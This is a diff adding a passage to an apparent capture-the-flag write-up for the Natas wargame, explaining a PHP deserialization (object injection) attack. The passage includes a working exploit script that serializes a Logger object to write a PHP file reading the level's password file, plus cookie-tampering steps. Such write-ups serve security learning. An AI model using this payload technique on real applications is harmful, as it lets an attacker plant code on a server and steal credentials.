@@ -589,8 +589,36 @@ we can also see a Logger class in that source
 ```
 In the class there are those ``__constuct()`` and ``__destruct()`` function which are called 'magic methods' of php ,which calls itself when the class is used
 
+In the above class bothe the function writes log msg to a file , since we have the unsirelize() function we can have object injection aka [php deserilization attack](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
+
+we can change the file to which we want ,but we can put that file img dir which we have acess to and we write a php file to show the contenst of password file
+``exploit script``
+```php
+<?php
+
+class Logger {
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    
+    function __construct(){
+        $this->initMsg="heyyyyyy\n";
+        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
+        $this->logFile ="img/info.php";
+    }
+}
 
 
+echo base64_encode(serialize(new Logger()))."\n";
+
+?>
+
+```
+this will create the serilized object  with base-64 encoding ,take the output ,url encode it and change the cookie value to our paylod
+
+
+
+and vist the infor.php in the img dir
 
 
 ![image](https://user-images.githubusercontent.com/61080375/111804798-6b644d80-88f6-11eb-9cb3-360db65de7eb.png)
